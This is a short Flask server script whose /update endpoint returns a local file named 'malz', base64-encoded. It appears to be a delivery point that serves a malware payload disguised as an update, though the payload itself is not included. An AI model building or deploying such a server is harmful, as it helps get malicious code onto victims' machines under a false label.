import base64 as b64

from flask import Flask

app = Flask(__name__)

def payload():
    with open("res/malz", "rb") as f:
        content = f.read()
        b64content = b64.b64encode(content)
    return str(b64content)

@app.route('/update', methods=['GET'])
def update():
    resp = payload()
    print(type(resp))
    return resp

if __name__ == "__main__":
    app.run()
